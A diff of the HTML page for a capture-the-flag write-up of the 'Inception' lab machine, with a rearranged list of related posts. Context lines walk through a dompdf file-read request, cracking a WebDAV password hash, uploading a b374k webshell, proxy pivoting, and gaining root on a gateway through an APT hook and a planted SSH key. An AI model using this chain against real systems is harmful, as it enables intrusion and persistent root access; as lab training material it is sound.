@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Inception write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -311,17 +311,17 @@ if (language) {
 
 <h2 id="port-scanning">Port scanning</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.67
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.67
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-04-14 09:24:04 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65536 ports/host]
 Discovered open port 80/tcp on 10.10.10.67                                     
-Discovered open port 3128/tcp on 10.10.10.67   </code></pre></div></div>
+Discovered open port 3128/tcp on 10.10.10.67   </code></pre></div>
 
 <p>We found TCP ports 80 and 3128 open. Let&rsquo;s explore them using nmap:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p80,3128 10.10.10.67
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -A -p80,3128 10.10.10.67
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-14 12:28 EEST
 Nmap scan report for 10.10.10.67
 Host is up (0.085s latency).
@@ -336,7 +336,7 @@ PORT     STATE SERVICE    VERSION
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)
 No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops</code></pre></div></div></p>
+Network Distance: 2 hops</code></pre></div></p>
 
 <h1 id="getting-shell">Getting shell</h1>
 
@@ -366,13 +366,13 @@ Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</code></pre></div></p>
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">0.6.0</code></pre></div></p>
 
 <p>Now, we can search for exploits:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit dompdf 0.6.0 -w
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ searchsploit dompdf 0.6.0 -w
 -------------------------------------------------------
 dompdf 0.6.0 - &#39;dompdf.php?read&#39; Arbitrary File Read
     https://www.exploit-db.com/exploits/33004/
 dompdf 0.6.0 beta1 - Remote File Inclusion
     https://www.exploit-db.com/exploits/14851/
--------------------------------------------------------</code></pre></div></div></p>
+-------------------------------------------------------</code></pre></div></p>
 
 <p>Exploit 33004 inform us for arbitrary file read vulnerability is present on dompdf.php file:
 <div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=&lt;PATH_TO_THE_FILE&gt;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div></p>
@@ -406,7 +406,7 @@ webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
 ...</code></pre></div></p>
 
 <p>Let&rsquo;s find the hash type (don&rsquo;t forget to escape $ or enclose the whole hash in single quotes):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashid \$apr1\$8rO7Smi4\$yqn7H.GvJFtsTou1a7VME0
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hashid \$apr1\$8rO7Smi4\$yqn7H.GvJFtsTou1a7VME0
 Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
 [+] MD5(APR) 
 [+] Apache MD5
@@ -414,26 +414,26 @@ Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
 $ hashid &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
 Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
 [+] MD5(APR) 
-[+] Apache MD5 </code></pre></div></div></p>
+[+] Apache MD5 </code></pre></div></p>
 
 <p>Let&rsquo;s crack (i.e. reverse) this hash:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashcat -h | grep MD5 | grep APR
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hashcat -h | grep MD5 | grep APR
    1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server
 
 $ hashcat -m 1600 &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39; /usr/share/dict/rockyou.txt
 ...
 $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Therefore our webdav login credentials are webdav_tester:babygurl69. If you try to obtain a usual shell you will discover soon that most kinds of traffic are blocked by the firewall. So, we are gonna upload a webshell to get us going:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cadaver
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cadaver
 dav:!&gt; open http://10.10.10.67/webdav_test_inception
 Authentication required for webdav test credential on server `127.0.1.1&#39;:
 Username: webdav_tester
 Password: babygurl69
 dav:/webdav_test_inception/&gt; put b374k.php
 Uploading b374k.php to `/webdav_test_inception/b374k.php&#39;:
-Progress: [=============================&gt;] 100.0% of 947 bytes succeeded.</code></pre></div></div></p>
+Progress: [=============================&gt;] 100.0% of 947 bytes succeeded.</code></pre></div></p>
 
 <p>Now, we can visit <a href="http://10.10.10.67/webdav_test_inception/b374k.php" target="_blank">http://10.10.10.67/webdav_test_inception/b374k.php</a> in order to have access to our webshell (use webdav_tester:babygurl69 again for credentials).</p>
 
@@ -455,7 +455,7 @@ http 10.10.10.67 3128
 ...</code></pre></div></p>
 
 <p>Now try this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ proxychains ssh cobb@127.0.1.1
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ proxychains ssh cobb@127.0.1.1
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib64/libproxychains.so.4.12
 [proxychains] DLL init: proxychains-ng 4.12
@@ -467,12 +467,12 @@ Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 Last login: Sat Apr 14 12:01:57 2018 from 127.0.0.1
-cobb@Inception:~$ </code></pre></div></div></p>
+cobb@Inception:~$ </code></pre></div></p>
 
 <p>Yeah! It works! :D</p>
 
 <p>Now let&rsquo;s see if our cobb user has any sudo right:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">cobb@Inception:~$ sudo -l
+<div class="bg-black"><pre><code class="language-console" data-lang="console">cobb@Inception:~$ sudo -l
 [sudo] password for cobb: VwPddNh7xMZyDQoByQL4
 Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -483,19 +483,19 @@ User cobb may run the following commands on Inception:
 cobb@Inception:~$ sudo -i (or sudo su)
 Password: VwPddNh7xMZyDQoByQL4
 root@Inception:/home/cobb# whoami
-root</code></pre></div></div>
+root</code></pre></div>
 Wow! We are root. Let&rsquo;s get this flag. :D</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/home/cobb# cd /root
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:/home/cobb# cd /root
 root@Inception:~# cat root.txt
-You&#39;re waiting for a train. A train that will take you far away. Wake up to find root.txt</code></pre></div></div>
+You&#39;re waiting for a train. A train that will take you far away. Wake up to find root.txt</code></pre></div>
 
 <p>Well&hellip; not so soon. It appears that we are inside another box.</p>
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
 <p>Let&rsquo;s explore a little:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~# cat /etc/resolv.conf
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:~# cat /etc/resolv.conf
 # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
 #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
 nameserver 192.168.0.1
@@ -527,16 +527,16 @@ iface eth0 inet static
     address 192.168.0.10
     netmask 255.255.255.0
     gateway 192.168.0.1
-    dns-nameservers 192.168.0.1</code></pre></div></div></p>
+    dns-nameservers 192.168.0.1</code></pre></div></p>
 
 <p>Well, it seems we are 192.168.0.10 and our gateway is 192.168.0.1. Let&rsquo;s find what ports are listening on the gateway (Look mom! No need for nmap! :D):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~# nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:~# nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded
 Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
 Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
-Connection to 192.168.0.1 53 port [tcp/domain] succeeded!</code></pre></div></div></p>
+Connection to 192.168.0.1 53 port [tcp/domain] succeeded!</code></pre></div></p>
 
 <p>Well, well. Port 21 (i.e. FTP) is open. Let&rsquo;s try it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/dev/shm# ftp 192.168.0.1
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:/dev/shm# ftp 192.168.0.1
 Connected to 192.168.0.1.
 220 (vsFTPd 3.0.3)
 Name (192.168.0.1:cobb): anonymous
@@ -545,10 +545,10 @@ Password: anonymous
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp&gt;</code></pre></div></div></p>
+ftp&gt;</code></pre></div></p>
 
 <p>That&rsquo;s it! Now, if we explore a little the gateway, using our FTP access, we are gonna find some intresting things:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">ftp&gt; cd /etc
+<div class="bg-black"><pre><code class="language-console" data-lang="console">ftp&gt; cd /etc
 250 Directory successfully changed.
 ftp&gt; get passwd
 local: passwd remote: passwd
@@ -596,7 +596,7 @@ root@Inception:~# cat crontab
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
 */5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
 30 23	* * *	root	apt upgrade -y 2&gt;&amp;1 &gt;/dev/null
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>We see that we have also TFTP access with writing permissions to create new files (in contrast our FTP access is read only):
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">--create, -c
@@ -614,24 +614,24 @@ root@Inception:~# cat crontab
 
 <p>Now, read this: <a href="https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/" target="_blank">https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/</a>
 We can add some hooks to run a command or script after running apt-get by adding or editing files inside the /etc/apt/apt.conf.d/ directory:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/dev/shm# echo &#39;APT::Update::Pre-Invoke {&#34;/bin/cp /root/root.txt /dev/shm/flag; chmod 755 /dev/shm/flag&#34;};&#39; &gt; 100update
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:/dev/shm# echo &#39;APT::Update::Pre-Invoke {&#34;/bin/cp /root/root.txt /dev/shm/flag; chmod 755 /dev/shm/flag&#34;};&#39; &gt; 100update
 root@Inception:/dev/shm# tftp 192.168.0.1
 tftp&gt; put 100update /etc/apt/apt.conf.d/100update
 Sent 56 bytes in 0.0 seconds
-tftp&gt; q</code></pre></div></div></p>
+tftp&gt; q</code></pre></div></p>
 
 <p>Now wait a little and the use ftp to read the flag:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~# ftp 192.168.0.1 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:~# ftp 192.168.0.1 
 ftp&gt; cd /dev/shm
 ftp&gt; get flag
 ftp&gt; bye
 root@Inception:~# cat root.txt
-8d1e2e91de427a6fc1a9dc309d563359</code></pre></div></div></p>
+8d1e2e91de427a6fc1a9dc309d563359</code></pre></div></p>
 
 <h2 id="getting-root-shell-on-192-168-0-1-via-ssh">Getting root shell (on 192.168.0.1 via SSH)</h2>
 
 <p>We can create a private/public key pair for our user:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/home# cd /root/.ssh
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:/home# cd /root/.ssh
 root@Inception:~/.ssh# ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/root/.ssh/id_rsa): 
@@ -655,19 +655,19 @@ The key&#39;s randomart image is:
 +----[SHA256]-----+
 
 root@Inception:~/.ssh# ls
-id_rsa  id_rsa.pub  known_hosts</code></pre></div></div></p>
+id_rsa  id_rsa.pub  known_hosts</code></pre></div></p>
 
 <p>Then we can upload our public key on 192.168.0.1:/id_rsa.pub /root/.ssh/authorized_keys using TFTP. The problem with this approach is that TFTP creates the file with too broad permissions (anyone is allowed to read or write it). SSH public keys fail if authorized_keys has incorrect permissions. But, we can use our previous apt trick to set the correct permissions:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~/.ssh# echo &#39;APT::Update::Pre-Invoke {&#34;chmod 600 /root/.ssh/authorized_keys&#34;};&#39; &gt; 10update
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:~/.ssh# echo &#39;APT::Update::Pre-Invoke {&#34;chmod 600 /root/.ssh/authorized_keys&#34;};&#39; &gt; 10update
 root@Inception:~/.ssh# tftp 192.168.0.1
 tftp&gt; put id_rsa.pub /root/.ssh/authorized_keys
 Sent 397 bytes in 0.0 seconds
 tftp&gt; put 10update /etc/apt/apt.conf.d/10update
 Sent 67 bytes in 0.0 seconds
-tftp&gt; q</code></pre></div></div></p>
+tftp&gt; q</code></pre></div></p>
 
 <p>Now wait a little and then you can connect to 192.168.0.1 as root via SSH:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~/.ssh# ssh root@192.168.0.1
+<div class="bg-black"><pre><code class="language-console" data-lang="console">root@Inception:~/.ssh# ssh root@192.168.0.1
 Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -678,7 +678,7 @@ Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
 0 updates are security updates.
 
 root@Inception:~# cat root.txt
-8d1e2e91de427a6fc1a9dc309d563359</code></pre></div></div></p>
+8d1e2e91de427a6fc1a9dc309d563359</code></pre></div></p>
 
         </div>
 
@@ -732,33 +732,93 @@ root@Inception:~# cat root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -796,73 +856,17 @@ root@Inception:~# cat root.txt
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
@@ -905,64 +909,20 @@ root@Inception:~# cat root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -985,144 +945,20 @@ root@Inception:~# cat root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1196,26 +1032,6 @@ root@Inception:~# cat root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
           
            
            
@@ -1225,116 +1041,20 @@ root@Inception:~# cat root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1379,26 +1099,6 @@ root@Inception:~# cat root.txt
           
            
            
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1468,17 +1168,29 @@ root@Inception:~# cat root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1499,6 +1211,38 @@ root@Inception:~# cat root.txt
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1519,6 +1263,42 @@ root@Inception:~# cat root.txt
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
